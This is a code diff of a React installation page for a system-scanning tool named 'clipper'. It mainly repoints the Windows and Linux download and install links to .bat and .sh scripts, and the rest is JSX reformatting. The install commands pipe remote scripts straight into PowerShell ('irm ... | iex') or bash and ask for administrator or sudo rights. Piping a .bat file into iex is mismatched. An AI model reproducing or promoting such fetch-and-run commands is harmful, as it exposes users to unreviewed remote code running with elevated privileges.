@@ -59,7 +59,7 @@ export default function InstallationPage() {
 
   const quickInstallCommands = {
     windows:
-      "irm https://aa6f8cd6-9526-49fe-9abe-c7500cf69a7c.canvases.tempo.build/install.ps1 | iex",
+      "irm https://aa6f8cd6-9526-49fe-9abe-c7500cf69a7c.canvases.tempo.build/clipper_windows.bat | iex",
     macos:
       "curl -fsSL https://aa6f8cd6-9526-49fe-9abe-c7500cf69a7c.canvases.tempo.build/install.sh | bash",
     linux:
@@ -68,7 +68,7 @@ export default function InstallationPage() {
 
   const downloadLinks = {
     windows:
-      "https://aa6f8cd6-9526-49fe-9abe-c7500cf69a7c.canvases.tempo.build/clipper-windows.exe",
+      "https://aa6f8cd6-9526-49fe-9abe-c7500cf69a7c.canvases.tempo.build/clipper_windows.bat",
     macos:
       "https://aa6f8cd6-9526-49fe-9abe-c7500cf69a7c.canvases.tempo.build/clipper-macos.tar.gz",
     linux:
@@ -90,11 +90,11 @@ export default function InstallationPage() {
       name: "Windows",
       icon: <Monitor className="w-5 h-5" />,
       installCommand:
-        "irm https://aa6f8cd6-9526-49fe-9abe-c7500cf69a7c.canvases.tempo.build/install.ps1 | iex",
+        "irm https://aa6f8cd6-9526-49fe-9abe-c7500cf69a7c.canvases.tempo.build/clipper_windows.bat | iex",
       runCommand: "clipper --help",
       requirements: ["PowerShell", "Administrator privileges", "Windows 10/11"],
       downloadUrl:
-        "https://aa6f8cd6-9526-49fe-9abe-c7500cf69a7c.canvases.tempo.build/clipper-windows.exe",
+        "https://aa6f8cd6-9526-49fe-9abe-c7500cf69a7c.canvases.tempo.build/clipper_windows.bat",
     },
     macos: {
       name: "macOS",
@@ -114,7 +114,7 @@ export default function InstallationPage() {
       runCommand: "clipper --help",
       requirements: ["Terminal", "sudo privileges", "curl"],
       downloadUrl:
-        "https://aa6f8cd6-9526-49fe-9abe-c7500cf69a7c.canvases.tempo.build/clipper-linux.gz",
+        "https://aa6f8cd6-9526-49fe-9abe-c7500cf69a7c.canvases.tempo.build/clipper_linux.sh",
     },
   };
 
@@ -417,52 +417,85 @@ export default function InstallationPage() {
 
             <div className="space-y-2">
               <h4 className="text-white font-medium">
-                {detectedOS === 'linux' ? 'Linux Script Commands:' : 'Available Commands:'}
+                {detectedOS === "linux"
+                  ? "Linux Script Commands:"
+                  : "Available Commands:"}
               </h4>
               <div className="text-sm text-gray-300 space-y-1">
-                {detectedOS === 'linux' ? (
+                {detectedOS === "linux" ? (
                   <>
                     <div>
-                      <code className="text-green-400">./clipper_linux.sh --scan</code> - Run comprehensive system scan
+                      <code className="text-green-400">
+                        ./clipper_linux.sh --scan
+                      </code>{" "}
+                      - Run comprehensive system scan
                     </div>
                     <div>
-                      <code className="text-green-400">./clipper_linux.sh --scan-quick</code> - Quick scan (basic info)
+                      <code className="text-green-400">
+                        ./clipper_linux.sh --scan-quick
+                      </code>{" "}
+                      - Quick scan (basic info)
                     </div>
                     <div>
-                      <code className="text-green-400">./clipper_linux.sh --hardware</code> - Hardware info only
+                      <code className="text-green-400">
+                        ./clipper_linux.sh --hardware
+                      </code>{" "}
+                      - Hardware info only
                     </div>
                     <div>
-                      <code className="text-green-400">./clipper_linux.sh --network</code> - Network info only
+                      <code className="text-green-400">
+                        ./clipper_linux.sh --network
+                      </code>{" "}
+                      - Network info only
                     </div>
                     <div>
-                      <code className="text-green-400">./clipper_linux.sh --performance</code> - Performance metrics
+                      <code className="text-green-400">
+                        ./clipper_linux.sh --performance
+                      </code>{" "}
+                      - Performance metrics
                     </div>
                     <div>
-                      <code className="text-green-400">./clipper_linux.sh --clean</code> - Clean system files
+                      <code className="text-green-400">
+                        ./clipper_linux.sh --clean
+                      </code>{" "}
+                      - Clean system files
                     </div>
                     <div>
-                      <code className="text-green-400">./clipper_linux.sh --export [FILE]</code> - Export to JSON
+                      <code className="text-green-400">
+                        ./clipper_linux.sh --export [FILE]
+                      </code>{" "}
+                      - Export to JSON
                     </div>
                     <div>
-                      <code className="text-green-400">./clipper_linux.sh --help</code> - Show all commands
+                      <code className="text-green-400">
+                        ./clipper_linux.sh --help
+                      </code>{" "}
+                      - Show all commands
                     </div>
                     <div>
-                      <code className="text-green-400">./clipper_linux.sh --version</code> - Show version
+                      <code className="text-green-400">
+                        ./clipper_linux.sh --version
+                      </code>{" "}
+                      - Show version
                     </div>
                   </>
                 ) : (
                   <>
                     <div>
-                      <code className="text-green-400">clipper --scan</code> - Run system scan
+                      <code className="text-green-400">clipper --scan</code> -
+                      Run system scan
                     </div>
                     <div>
-                      <code className="text-green-400">clipper --optimize</code> - Optimize system
+                      <code className="text-green-400">clipper --optimize</code>{" "}
+                      - Optimize system
                     </div>
                     <div>
-                      <code className="text-green-400">clipper --security</code> - Security audit
+                      <code className="text-green-400">clipper --security</code>{" "}
+                      - Security audit
                     </div>
                     <div>
-                      <code className="text-green-400">clipper --help</code> - Show all commands
+                      <code className="text-green-400">clipper --help</code> -
+                      Show all commands
                     </div>
                   </>
                 )}
